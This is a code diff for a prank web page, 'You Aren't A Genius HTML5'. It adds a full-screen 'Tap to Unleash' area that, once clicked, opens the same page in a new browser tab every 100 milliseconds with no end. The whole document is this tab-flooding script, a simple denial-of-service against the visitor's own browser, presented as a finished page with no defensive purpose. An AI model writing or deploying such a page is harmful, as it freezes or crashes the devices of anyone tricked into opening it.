@@ -3,24 +3,42 @@
 <head>
   <meta charset="UTF-8" />
   <title>You Aren't A Genius HTML5</title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      overflow: hidden;
+      font-family: sans-serif;
+    }
+    #click-area {
+      width: 100%;
+      height: 100%;
+      background-color: #111;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 2em;
+      cursor: pointer;
+      user-select: none;
+    }
+  </style>
 </head>
 <body>
-  <p id="status">Idle</p>
+  <div id="click-area">Tap to Unleash</div>
+
   <script>
-    const url = window.location.href; // Get current page URL
-    let started;  // declared but not used; you can keep or remove it as you wish
-    
-    const statusEl = document.getElementById('status');
-    statusEl.textContent = "You aren't a genius";
+    const url = window.location.href;
+    const clickArea = document.getElementById('click-area');
 
-    setTimeout(() => {
-      statusEl.textContent = "Unleashed";
-
+    clickArea.addEventListener('click', () => {
+      clickArea.textContent = "Unleashed";
+      
       setInterval(() => {
-        window.open(url, '_blank'); // Opens this same page
-      }, 100); // Every 100ms
-    }, 3000); // Wait 3 seconds
+        window.open(url, '_blank');
+      }, 100);
+    }, { once: true }); // Only allow the action once
   </script>
 </body>
 </html>
-
